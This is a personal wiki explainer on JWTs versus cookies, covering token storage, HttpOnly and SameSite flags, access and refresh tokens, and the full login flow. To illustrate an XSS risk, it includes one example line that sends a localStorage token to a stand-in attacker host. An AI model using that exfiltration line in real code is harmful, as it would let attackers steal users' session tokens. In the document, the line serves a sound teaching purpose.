# JWT vs Cookies — Personal Wiki

> A plain-language guide to what JWTs and cookies are, how they relate, and how they work together in a real app.

---

## The Hotel Analogy

Think of authentication like checking into a hotel.

- **Your passport** = your email + password
- **The front desk verifying it** = the login endpoint
- **Your keycard** = the token the server gives you after login
- **Tapping the keycard** = sending the token with every request

You show your passport once. After that, you just tap the keycard. You don't re-enter your password on every request — you prove who you are using the token the server gave you.

---

## What is a JWT?

JWT stands for **JSON Web Token**. It is the **format of the token** — what the credential looks like and what it contains.

It is a small piece of text with three parts separated by dots:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c3JfMDAxIn0.sFlKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Decoded, it contains readable identity information:

```json
{
  "userId": "usr_001",
  "role": "GUEST",
  "email": "jane@example.com",
  "expiresAt": "2025-11-01T10:00:00Z"
}
```

The server puts your identity inside the token, **signs it cryptographically**, and sends it to you. When you send it back on the next request, the server reads it and instantly knows who you are — no database lookup needed. The signature guarantees the token has not been tampered with.

---

## What is a Cookie?

A cookie is a **small storage box that lives in your browser**.

The server says: *"Hey browser, hold onto this piece of text for me."* The browser saves it. Then — and this is the key behaviour — **the browser automatically sends it back on every future request to that server**, without any JavaScript doing anything.

That is all a cookie is. Browser storage with automatic delivery.

---

## The Relationship

JWT and cookies are completely separate things that are often used together.

```
JWT     =  what the token contains       (the keycard data)
Cookie  =  where the token lives         (the wallet holding the keycard)
```

You can put a JWT inside a cookie. You can also put a JWT in `localStorage`. You can even put a non-JWT token in a cookie. They do not depend on each other — the combination is a choice, not a requirement.

---

## Where You Can Store a JWT

Once the server issues a JWT, your application has to put it somewhere in the browser. There are two main options.

**Option A — `localStorage` + `Authorization` header**

```
Login → server returns JWT in response body
→ JS saves it:     localStorage.setItem('token', jwt)
→ JS attaches it:  headers: { Authorization: 'Bearer ' + token }
```

**Option B — HttpOnly Cookie**

```
Login → server sends JWT inside a Set-Cookie header
→ browser saves it automatically
→ browser sends it automatically on every request
→ JS does nothing
```

Both options work. The difference is who is responsible for the token — your JavaScript code, or the browser itself.

---

## Why HttpOnly Cookies Are Safer

If an attacker manages to inject malicious JavaScript into your page (XSS), they can steal a token from `localStorage` trivially:

```javascript
// Token in localStorage — completely exposed
fetch('https://attacker.com/?token=' + localStorage.getItem('token'))
```

If the token is in an **HttpOnly cookie**, that attack fails completely:

```javascript
// HttpOnly cookie — JS cannot read this at all
// document.cookie will not show it
// fetch cannot access it
// The browser guards it at the OS level
```

`HttpOnly` is a flag on the cookie that tells the browser: *this cookie is for you to send automatically — JavaScript is not allowed to touch it.*

---

## Comparison Table

| | `localStorage` + Header | HttpOnly Cookie |
|---|---|---|
| Who holds the token? | Your JS code | The browser |
| Who sends the token? | Your JS code | The browser (automatic) |
| Can JS read it? | Yes | No |
| Safe from XSS? | No | Yes |
| CSRF risk? | None | Needs `SameSite=Strict` |
| Works for mobile apps? | Natural fit | Awkward |
| Extra backend config? | None | Small amount |

### CSRF — the one cookie weakness

Because browsers send cookies automatically, a malicious third-party site can trick a logged-in user's browser into making an unintended request — the cookie goes along for the ride. The fix is the `SameSite=Strict` flag, which tells the browser to only send the cookie if the request originates from your own site.

```java
ResponseCookie.from("access_token", accessToken)
    .httpOnly(true)        // JS cannot read this
    .secure(true)          // HTTPS only
    .sameSite("Strict")    // Blocks CSRF
    .path("/")
    .maxAge(3600)
    .build();
```

---

## What Gets Stored Where

This is the most important thing to understand clearly.

```
Browser                     Your Server                  Database
───────────────────         ─────────────────────        ─────────────────────
Cookie jar                  JWT secret key               users table
  └── access_token (JWT)    (to sign & verify JWTs)      refresh_tokens table
  └── refresh_token                                         └── token (opaque)
                                                            └── user_id
                                                            └── expires_at
                                                            └── revoked
```

- The **JWT access token** is never stored in the database. The server verifies it by checking its cryptographic signature using the secret key. No database lookup needed.
- The **cookie** lives in the browser. It never touches the database.
- The **refresh token** is stored in the database — but it is not a JWT. It is a random opaque string that means nothing on its own.

---

## Two Tokens, Two Purposes

A production auth system issues two tokens on login, not one.

**Access token (JWT)**
- Short-lived: 1 hour
- Stateless: server verifies by signature, no DB lookup
- Cannot be revoked early — if leaked, it is valid until expiry
- This is why it is kept short-lived

**Refresh token (opaque string)**
- Long-lived: 30 days
- Stored in the database
- Can be revoked instantly by flipping a `revoked` flag
- Used only to obtain a new access token when the old one expires

```
a3f8c2d1-9b4e-4f7a-8c3d-2e1f0a9b8c7d
```

There is no identity information inside a refresh token. It is just a random ID that maps to a user row in the database. The server looks it up, checks it is not revoked or expired, and if valid, issues a new JWT access token.

---

## Why the Asymmetry?

Ask: what happens when you need to invalidate a token?

With a JWT you cannot — once issued, it is valid until it expires. The server has no record of it to un-trust. This is the trade-off of stateless tokens: fast to verify, impossible to revoke mid-life.

With a refresh token you can — just set `revoked = true` in the database. Logout, password change, and account suspension all target the refresh token for exactly this reason.

```
User logs out
→ refresh token marked revoked in DB
→ access token still technically valid, but expires within 1 hour
→ next refresh attempt is rejected
→ user is effectively logged out within the hour
```

---

## The Full Flow, Step by Step

```
1. User logs in
   → server creates JWT access token         (NOT stored in DB)
   → server creates opaque refresh token     (stored in DB)
   → both sent to browser as HttpOnly cookies

2. User makes a request
   → browser sends access token cookie automatically
   → server verifies JWT signature           (no DB lookup)
   → request is processed

3. Access token expires after 1 hour
   → browser sends refresh token cookie
   → server looks up refresh token in DB
   → if valid   → issues a new JWT access token
   → if revoked → user must log in again

4. User logs out
   → server marks refresh token as revoked in DB
   → server clears both cookies from browser
```

---

## For Mobile Apps

Cookies are a browser primitive. Mobile apps do not have a browser cookie jar, so they skip cookies entirely and store tokens in secure device storage (iOS Keychain, Android Keystore). They then send the JWT manually in the `Authorization` header on every request.

Your backend handles both transparently:

```java
// JwtAuthFilter checks both places
String token = extractFromCookie(request);        // web clients
if (token == null) token = extractFromHeader(request);  // mobile clients
```

---

## Summary

| Concept | One-liner |
|---|---|
| JWT | A signed piece of text that carries your identity. Verified by math, not a database. |
| Cookie | Browser storage that delivers its contents automatically on every request. |
| HttpOnly cookie | A cookie that JavaScript cannot read. The safest place to store a token in a browser. |
| Access token | Short-lived JWT. Fast to verify. Cannot be revoked. |
| Refresh token | Long-lived opaque string. Stored in DB. Can be revoked instantly. |
| `SameSite=Strict` | Cookie flag that blocks CSRF attacks. |

> The **JWT** is verified by math, so it never needs to be stored on the server. The **refresh token** is verified by database lookup, so it must be stored — and that is exactly what gives you the power to revoke it. The **cookie** is just the delivery envelope for both. It lives in the browser and never touches your database.